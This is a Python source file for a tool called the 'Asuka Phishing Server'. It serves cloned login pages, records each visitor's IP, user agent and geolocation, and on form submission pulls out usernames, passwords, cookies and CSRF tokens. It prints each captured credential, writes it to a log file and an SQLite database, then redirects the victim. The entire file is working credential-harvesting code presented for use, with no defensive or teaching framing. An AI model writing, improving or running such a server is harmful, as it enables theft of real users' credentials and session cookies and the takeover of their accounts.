#!/usr/bin/env python3
"""
Asuka Phishing Server
Serves cloned web pages, captures credentials, and logs interactions.
"""

import os
import sqlite3
import urllib.parse
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from datetime import datetime
import json
import base64
from cryptography.fernet import Fernet
import logging
import re
import socket
from .utils import get_geolocation

class No404Errors(logging.Filter):
    """
    Custom logging filter to suppress specific error messages related to 404 errors.
    """
    def filter(self, record):
        msg = record.getMessage()
        return not (
            "Resource not found" in msg or
            "Invalid POST path" in msg or
            "Template file not found" in msg
        )

def configure_logging(show_logs):
    """
    Configures logging to write to a file and optionally to the console.
    """
    logging.getLogger('').handlers = []
    handlers = [logging.FileHandler('server.log')]
    if show_logs:
        console_handler = logging.StreamHandler()
        console_handler.setLevel(logging.DEBUG)
        handlers.append(console_handler)
    
    logging.basicConfig(
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=handlers
    )
    
    logging.getLogger().addFilter(No404Errors())

# Load Fernet key
fernet_key_file = 'fernet_key.bin'
if os.path.exists(fernet_key_file):
    with open(fernet_key_file, 'rb') as f:
        fernet_key = f.read()
else:
    logging.error("Fernet key file not found")
    raise Exception("Fernet key file not found")
cipher = Fernet(fernet_key)

# Track recent submissions to prevent duplicates
recent_submissions = {}
processed_request_ids = set()

class AsukaHandler(BaseHTTPRequestHandler):
    """
    Custom HTTP request handler for the phishing server.
    """
    def __init__(self, *args, template_path=None, redirect_url=None, show_logs=False, **kwargs):
        """
        Initialize the handler with template path, redirect URL, and logging settings.
        """
        self.template_path = template_path
        self.redirect_url = redirect_url
        self.show_logs = show_logs
        super().__init__(*args, **kwargs)

    def log_request(self, code='-', size='-'):
        """
        Override default request logging to include client IP and timestamp.
        """
        if isinstance(code, int):
            msg = f'"{self.requestline}" {code} {size}'
        else:
            msg = f'"{self.requestline}" {code}'
        logging.info(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {msg}")

    def log_error(self, format, *args):
        """
        Override default error logging to include client IP and timestamp.
        """
        logging.error(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")

    def do_GET(self):
        """
        Handle GET requests to serve the cloned website or its assets.
        """
        logging.debug(f"Received GET request for path: {self.path}")
        try:
            requested_path = self.path.lstrip('/')
            if not requested_path or requested_path == 'index.html':
                requested_path = os.path.basename(self.template_path)

            if not self.template_path:
                logging.error("No template path selected")
                self.send_error(400, "No page selected")
                return

            base_template_dir = os.path.dirname(self.template_path)
            full_path = os.path.normpath(os.path.join(base_template_dir, requested_path)).replace(os.sep, '/')

            if not full_path.startswith(os.path.normpath(base_template_dir)):
                logging.error(f"Access denied to path outside template directory: {full_path}")
                self.send_error(403, "Forbidden")
                return

            if not os.path.exists(full_path):
                logging.error(f"Resource not found: {full_path}")
                self.send_error(404, f"Resource not found: {full_path}")
                return

            with open(full_path, 'rb') as f:
                content = f.read()
                self.send_response(200)
                content_type = {
                    '.html': 'text/html',
                    '.css': 'text/css',
                    '.js': 'application/javascript',
                    '.png': 'image/png',
                    '.jpg': 'image/jpeg',
                    '.gif': 'image/gif',
                    '.ico': 'image/x-icon',
                    '.woff': 'font/woff',
                    '.woff2': 'font/woff2',
                    '.ttf': 'font/ttf',
                    '.otf': 'font/otf',
                    '.svg': 'image/svg+xml',
                    '.json': 'application/json'
                }.get(os.path.splitext(full_path)[1].lower(), 'application/octet-stream')
                self.send_header('Content-Type', content_type)
                self.send_header('Content-Length', len(content))
                self.end_headers()
                self.wfile.write(content)
                logging.info(f"Served resource: {full_path}")

            try:
                conn = sqlite3.connect('asuka_data.db', timeout=10)
                c = conn.cursor()
                ip = self.client_address[0]
                user_agent = self.headers.get('User-Agent', '')
                geolocation = get_geolocation(ip)
                c.execute('''INSERT INTO sessions (timestamp, ip, user_agent, path, geolocation)
                             VALUES (?, ?, ?, ?, ?)''',
                          (datetime.now().isoformat(), ip, user_agent, full_path, geolocation))
                conn.commit()
            except sqlite3.Error as e:
                logging.error(f"Database error: {e}")
            finally:
                conn.close()

        except Exception as e:
            logging.error(f"Error in do_GET for {self.path}: {e}")
            self.send_error(500, "Internal Server Error")

    def do_POST(self):
        """
        Handle POST requests to capture credentials and error logs.
        """
        logging.debug(f"Received POST request for path: {self.path}, headers: {dict(self.headers)}")
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
            params = urllib.parse.parse_qs(post_data)
            logging.debug(f"POST data received: {post_data}")

            if self.path.split('?')[0].rstrip('/') == '/login':
                request_id = self.headers.get('X-Request-Id', '')
                if request_id in processed_request_ids:
                    logging.debug(f"Skipping duplicate request ID: {request_id}")
                    self.send_response(302)
                    self.send_header('Location', self.redirect_url)
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    return
                processed_request_ids.add(request_id)

                username = None
                password = None
                csrf_token = None
                raw_data = post_data

                encrypted_data = params.get('data', [''])[0]
                if encrypted_data:
                    try:
                        key, data = encrypted_data.split(':', 1)
                        decoded_key = base64.b64decode(key)
                        if decoded_key == fernet_key:
                            decrypted = json.loads(base64.b64decode(data).decode('utf-8', errors='ignore'))
                            logging.debug(f"Decrypted data: {decrypted}")
                            for field, value in decrypted.items():
                                if not value:
                                    continue
                                if field == 'password':
                                    password = value
                                elif field == 'username':
                                    username = value
                                elif field == 'csrf_token' or field.lower() in ('authenticity_token', 'csrfmiddlewaretoken', 'csrf_token', 'csrftoken'):
                                    csrf_token = value
                            if not username or not password:
                                username_candidates = []
                                password_candidates = []
                                for field, value in decrypted.items():
                                    if not value:
                                        continue
                                    field_lower = field.lower()
                                    score = 0
                                    if re.search(r'login|username|email|user|key|account|id', field_lower):
                                        score += 0.8
                                    if 'email' in field_lower or 'login' in field_lower:
                                        score += 0.2
                                    if score > 0:
                                        username_candidates.append((field, value, score))
                                    score = 0
                                    if re.search(r'password|pass|pwd', field_lower):
                                        score += 0.9
                                    if score > 0:
                                        password_candidates.append((field, value, score))
                                if username_candidates:
                                    username = max(username_candidates, key=lambda x: x[2])[1]
                                    logging.debug(f"Selected username: {username} (score: {max(username_candidates, key=lambda x: x[2])[2]})")
                                if password_candidates:
                                    password = max(password_candidates, key=lambda x: x[2])[1]
                                    logging.debug(f"Selected password: {password} (score: {max(password_candidates, key=lambda x: x[2])[2]})")
                        else:
                            logging.error(f"Key mismatch: {key}")
                    except Exception as e:
                        logging.error(f"Error decrypting data: {e}")

                if not (username and password):
                    for field, values in params.items():
                        value = values[0]
                        if not value:
                            continue
                        field_lower = field.lower()
                        if not username and re.search(r'login|username|email|user|key|account|id', field_lower):
                            username = value
                        elif not password and re.search(r'password|pass|pwd', field_lower):
                            password = value
                        elif field_lower in ('authenticity_token', 'csrfmiddlewaretoken', 'csrf_token', 'csrftoken'):
                            csrf_token = value

                username = username or "N/A"
                password = password or "N/A"
                csrf_token = csrf_token or "N/A"
                cookies = self.headers.get('Cookie', '') or "N/A"
                ip = self.client_address[0]

                current_time = datetime.now().timestamp()
                submission_key = (ip, username)
                
                # Skip if password is encrypted or duplicate submission
                if password.startswith('#PWD_BROWSER') or (submission_key in recent_submissions and current_time - recent_submissions[submission_key] < 1):
                    logging.debug(f"Skipping submission: encrypted={password.startswith('#PWD_BROWSER')}, duplicate={submission_key in recent_submissions}, username={username}, ip={ip}, requestId={request_id}")
                    self.send_response(302)
                    self.send_header('Location', self.redirect_url)
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    return

                recent_submissions[submission_key] = current_time
                for k in list(recent_submissions.keys()):
                    if current_time - recent_submissions[k] > 1:
                        del recent_submissions[k]

                print("\033[32m----------One Credential Captured!!----------\033[0m")
                print(f"\033[32m[+] Timestamp: {datetime.now().isoformat()}\033[0m")
                print(f"\033[32m[+] Username: {username}\033[0m")
                print(f"\033[32m[+] Password: {password}\033[0m")
                print(f"\033[32m[+] IP Address: {ip}\033[0m")
                print(f"\033[32m[+] User-Agent: {self.headers.get('User-Agent', 'N/A')}\033[0m")
                print(f"\033[32m[+] Cookies: {cookies}\033[0m")
                print(f"\033[32m[+] CSRF Token: {csrf_token}\033[0m")
                print(f"\033[32m[+] Raw Data: {raw_data}\033[0m")
                print(f"\033[32m[+] Request ID: {request_id}\033[0m")

                credential_message = (
                    "----------One Credential Captured!!----------\n"
                    f"[+] Timestamp: {datetime.now().isoformat()}\n"
                    f"[+] Username: {username}\n"
                    f"[+] Password: {password}\n"
                    f"[+] IP Address: {ip}\n"
                    f"[+] User-Agent: {self.headers.get('User-Agent', 'N/A')}\n"
                    f"[+] Cookies: {cookies}\n"
                    f"[+] CSRF Token: {csrf_token}\n"
                    f"[+] Raw Data: {raw_data}\n"
                    f"[+] Request ID: {request_id}"
                )
                logging.info(credential_message)

                with open('credentials.log', 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now().isoformat()}] Username: {username}, Password: {password}, IP: {ip}, User-Agent: {self.headers.get('User-Agent', 'N/A')}, Cookies: {cookies}, CSRF: {csrf_token}, Raw: {raw_data}, RequestId: {request_id}\n")

                try:
                    conn = sqlite3.connect('asuka_data.db', timeout=10)
                    c = conn.cursor()
                    c.execute('''INSERT INTO CREDENTIALS (timestamp, username, password, ip, user_agent, cookies, raw_data, csrf_token)
                                 VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                              (datetime.now().isoformat(), username, password, ip, self.headers.get('User-Agent', 'N/A'), cookies, raw_data, csrf_token))
                    conn.commit()
                    logging.info(f"Credentials saved: {username}, {ip}, requestId={request_id}")
                except sqlite3.Error as e:
                    logging.error(f"Database error: {e}")
                finally:
                    conn.close()

                self.send_response(302)
                self.send_header('Location', self.redirect_url)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()

            elif self.path == '/error_log':
                error_message = params.get('error', [''])[0]
                logging.error(f"Client-side error: {error_message}")
                with open('error_log.log', 'a', encoding='utf-8') as f:
                    f.write(f"[{datetime.now().isoformat()}] Client Error: {error_message}\n")
                self.send_response(200)
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()

            else:
                logging.error(f"Invalid POST path: {self.path}")
                self.send_error(404, f"Invalid endpoint: {self.path}")

        except Exception as e:
            logging.error(f"Error in do_POST for {self.path}: {e}")
            self.send_error(500, "Internal Server Error")

def is_port_in_use(host, port):
    """
    Check if a given host and port combination is already in use.
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind((host, port))
            return False
        except OSError:
            return True

def start_server(host, port, template_path, redirect_url, show_logs=False):
    """
    Start the phishing server using ThreadingHTTPServer.
    """
    configure_logging(show_logs)
    from functools import partial
    Handler = partial(AsukaHandler, template_path=template_path, redirect_url=redirect_url, show_logs=show_logs)
    try:
        httpd = ThreadingHTTPServer((host, port), Handler)
        print(f"[+] Phishing page hosted at: http://{host}:{port}")
        print(f"[*] Waiting for credentials... (Ctrl+C to stop)")
        httpd.serve_forever()
    except OSError as e:
        logging.error(f"HTTP server error: {e}")
        print(f"[!] Error: Failed to start HTTP server on {host}:{port}. {e}")
    except KeyboardInterrupt:
        print("\n[*] Shutting down server...")
        httpd.server_close()
